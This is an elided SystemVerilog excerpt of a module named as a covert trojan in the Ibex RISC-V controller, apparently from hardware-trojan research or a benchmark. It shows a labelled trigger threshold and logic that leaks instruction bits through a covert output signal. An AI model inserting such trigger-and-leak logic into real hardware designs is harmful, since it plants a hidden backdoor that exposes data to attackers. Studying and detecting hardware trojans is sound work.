...
module ibex_controller_trojan_Covert #(
  ...
  output logic                  perf_tbranch_o           // we are executing a taken branch
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=22275)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22275;
    ...
    assign covert_current_bit = instr_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
